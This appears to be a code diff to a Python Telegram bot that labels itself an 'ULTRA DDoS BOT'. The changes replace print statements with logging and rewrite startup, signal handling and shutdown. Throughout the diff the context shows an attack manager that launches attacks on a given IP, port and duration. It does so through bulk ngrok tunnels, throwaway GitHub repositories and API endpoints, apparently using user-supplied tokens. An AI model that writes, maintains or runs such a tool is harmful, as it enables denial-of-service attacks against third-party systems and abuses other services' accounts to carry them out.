@@ -46,6 +46,13 @@ CONCURRENT_FILE = "concurrent.json"
 # Track running attacks per chat
 ACTIVE_ATTACKS: Dict[int, List[Dict]] = {}
 
+# Configure logging
+logging.basicConfig(
+    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
+    level=logging.DEBUG
+)
+logger = logging.getLogger(__name__)
+
 # ---------------- Ultra Tunnel Manager ----------------
 class UltraTunnelManager:
     def __init__(self):
@@ -67,10 +74,10 @@ class UltraTunnelManager:
                 text=True
             )
             time.sleep(2)
-            print("🚀 Ultra Ngrok service started")
+            logger.info("🚀 Ultra Ngrok service started")
             return True
         except Exception as e:
-            print(f"❌ Ngrok service error: {e}")
+            logger.error(f"❌ Ngrok service error: {e}")
             return False
     
     async def create_bulk_tunnels(self, tokens: List[str]) -> Dict[str, str]:
@@ -105,7 +112,7 @@ class UltraTunnelManager:
                             }
                             return token, public_url
             except Exception as e:
-                print(f"❌ Tunnel failed for {token[:10]}: {e}")
+                logger.error(f"❌ Tunnel failed for {token[:10]}: {e}")
             return token, None
         
         # Create all tunnels concurrently
@@ -116,7 +123,7 @@ class UltraTunnelManager:
             if url:
                 results[token] = url
         
-        print(f"🎯 Bulk tunnels created: {len(results)}/{len(tokens)}")
+        logger.info(f"🎯 Bulk tunnels created: {len(results)}/{len(tokens)}")
         return results
     
     def get_tunnel_status(self):
@@ -186,7 +193,7 @@ class InstantAttackManager:
             except asyncio.TimeoutError:
                 continue
             except Exception as e:
-                print(f"❌ Attack worker error: {e}")
+                logger.error(f"❌ Attack worker error: {e}")
                 
     async def _execute_instant_attack(self, attack_data: Dict):
         """Execute attack with maximum speed"""
@@ -270,7 +277,7 @@ class InstantAttackManager:
             asyncio.create_task(self._cleanup_after_attack(tunnel_results, duration))
             
         except Exception as e:
-            print(f"❌ Instant attack error: {e}")
+            logger.error(f"❌ Instant attack error: {e}")
     
     def _load_user_tokens_instant(self, uid: int) -> List[str]:
         """Ultra-fast token loading"""
@@ -332,7 +339,7 @@ class InstantAttackManager:
             asyncio.create_task(self._quick_cleanup_repo(token, full_name, duration))
             
         except Exception as e:
-            print(f"❌ GitHub attack error: {e}")
+            logger.error(f"❌ GitHub attack error: {e}")
     
     async def _launch_tunnel_attack(self, tunnel_url: str, ip: str, port: str, duration: str):
         """Launch tunnel attack instantly"""
@@ -341,7 +348,7 @@ class InstantAttackManager:
             async with aiohttp.ClientSession() as session:
                 async with session.get(url, timeout=5) as response:
                     if response.status == 200:
-                        print(f"✅ Tunnel attack: {tunnel_url}")
+                        logger.info(f"✅ Tunnel attack: {tunnel_url}")
         except:
             pass
     
@@ -352,7 +359,7 @@ class InstantAttackManager:
             async with aiohttp.ClientSession() as session:
                 async with session.get(url, timeout=3) as response:
                     if response.status == 200:
-                        print(f"✅ API attack: {ip}:{port}")
+                        logger.info(f"✅ API attack: {ip}:{port}")
         except:
             pass
     
@@ -1196,69 +1203,68 @@ def build_app():
     
     return app
 
-# ---------------- Startup ----------------
-import atexit
-
-async def cleanup_on_exit():
+# ---------------- Startup and Cleanup ----------------
+async def cleanup_on_exit(app):
     """Cleanup on exit"""
-    print("🔄 Cleaning up ultra tunnels...")
+    logger.info("🔄 Cleaning up ultra tunnels...")
     ultra_tunnel_manager.stop_all_tunnels()
     instant_attack_manager.is_running = False
     await asyncio.sleep(0)  # Allow pending tasks to complete
+    await app.stop()
+    await app.shutdown()
 
-@atexit.register
-def sync_cleanup_on_exit():
-    """Synchronous wrapper for cleanup"""
-    loop = asyncio.new_event_loop()
-    asyncio.set_event_loop(loop)
-    loop.run_until_complete(cleanup_on_exit())
-
-def signal_handler(signum, frame):
+def signal_handler(signum, frame, app):
     """Handle shutdown signals"""
-    print(f"\n🛑 Received signal {signum}, shutting down Ultra Bot...")
-    asyncio.create_task(asyncio.get_running_loop().run_until_complete(cleanup_on_exit()))
-    asyncio.get_running_loop().stop()
+    logger.info(f"🛑 Received signal {signum}, shutting down Ultra Bot...")
+    loop = asyncio.get_event_loop()
+    loop.create_task(cleanup_on_exit(app))
+    loop.stop()
 
 async def startup_tasks():
     """Start background tasks"""
     try:
         await instant_attack_manager.start_worker()
         if not ultra_tunnel_manager.start_ngrok_service():
-            print("⚠️ Failed to start ngrok service")
+            logger.warning("⚠️ Failed to start ngrok service")
     except Exception as e:
-        print(f"❌ Startup task error: {e}")
+        logger.error(f"❌ Startup task error: {e}")
 
 async def main():
     """Main async function to run the bot"""
-    logging.basicConfig(level=logging.DEBUG)
-    logger = logging.getLogger(__name__)
-    
     logger.info("💥 STARTING ULTRA DDoS BOT...")
     logger.info("🚀 Features: Instant Attacks • Auto-Tunnels • Power Boosting")
     
+    # Create application
     app = build_app()
+    
     try:
         logger.debug("Initializing application...")
         await app.initialize()
         logger.debug("Starting background tasks...")
         await startup_tasks()
         
-        signal.signal(signal.SIGINT, signal_handler)
-        signal.signal(signal.SIGTERM, signal_handler)
+        # Register signal handlers
+        signal.signal(signal.SIGINT, lambda s, f: signal_handler(s, f, app))
+        signal.signal(signal.SIGTERM, lambda s, f: signal_handler(s, f, app))
         
         logger.info("🤖 Ultra Bot is now running...")
-        await app.run_polling()
+        await app.start()
+        await app.updater.start_polling(allowed_updates=Update.ALL_TYPES)
+        await asyncio.Event().wait()  # Keep running until interrupted
     except Exception as e:
         logger.error(f"❌ Ultra Bot error: {e}", exc_info=True)
     finally:
         logger.debug("🔄 Performing final cleanup...")
-        await app.shutdown()
-        await cleanup_on_exit()
+        await cleanup_on_exit(app)
 
 if __name__ == "__main__":
+    loop = asyncio.get_event_loop()
     try:
-        asyncio.run(main())
+        loop.run_until_complete(main())
     except KeyboardInterrupt:
-        print("\n🛑 Ultra Bot stopped by user")
+        logger.info("🛑 Ultra Bot stopped by user")
     except Exception as e:
-        print(f"❌ Fatal error: {e}")
+        logger.error(f"❌ Fatal error: {e}", exc_info=True)
+    finally:
+        loop.run_until_complete(loop.shutdown_asyncgens())
+        loop.close()
